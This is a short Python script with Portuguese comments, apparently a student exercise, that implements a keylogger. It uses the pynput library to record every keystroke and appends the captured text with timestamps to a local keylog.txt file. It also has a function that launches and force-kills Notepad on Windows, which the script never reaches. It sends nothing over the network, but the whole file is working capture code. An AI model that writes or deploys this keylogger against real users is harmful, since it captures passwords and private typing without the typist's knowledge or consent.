import os
import datetime
import time
import platform
from pynput import keyboard

# Diretório onde o arquivo de log será salvo
log_directory = '/home/dirceu/Desktop/EXERCICIOS PYTHON/estudo'
log_file = "keylog.txt"
log = ""

def on_key_release(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log = log[:-1]

def start_keylogger():
    global log
    listener = keyboard.Listener(on_key_release=on_key_release)
    listener.start()

    try:
        while True:
            if len(log) > 0:
                try:
                    os.makedirs(log_directory, exist_ok=True)  # Certifique-se de que o diretório exista
                    log_path = os.path.join(log_directory, log_file)
                    print(f"Tentando gravar em {log_path}")  # Mensagem de depuração
                    with open(log_path, "a") as f:
                        f.write(f"[{datetime.datetime.now()}] {log}\n")
                        print("Log gravado com sucesso.")
                    log = ""
                except Exception as e:
                    print(f"Erro ao escrever no arquivo: {str(e)}")
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        print("Keylogger encerrado.")
        listener.stop()

# Configurações do programa em segundo plano
program_name = "notepad.exe"
program_path = r'C:\Windows\System32\notepad.exe'

def run_program_background():
    if platform.system() == 'Windows':
        process = os.system(f'start {program_path}')
        time.sleep(10)
        os.system(f'taskkill /f /im {program_name}')

if __name__ == "__main__":
    start_keylogger()
    run_program_background()
